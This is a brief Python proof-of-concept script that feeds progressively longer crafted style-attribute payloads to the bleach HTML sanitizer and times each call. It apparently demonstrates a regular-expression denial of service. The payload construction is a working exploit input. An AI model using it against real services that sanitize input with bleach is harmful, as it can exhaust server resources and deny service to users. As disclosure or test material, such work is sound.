import time
import bleach

i = 1
while i < 28:
    t_start = time.perf_counter()
    payload = "'" + '"a"' * i + '^' + "'"
    bleach.clean('<a style=' + payload + '></a>', attributes={'a': ['style']})
    print("Time elapsed for regex of size " + str(i) + ": " + str(time.perf_counter() - t_start))
    i += 1
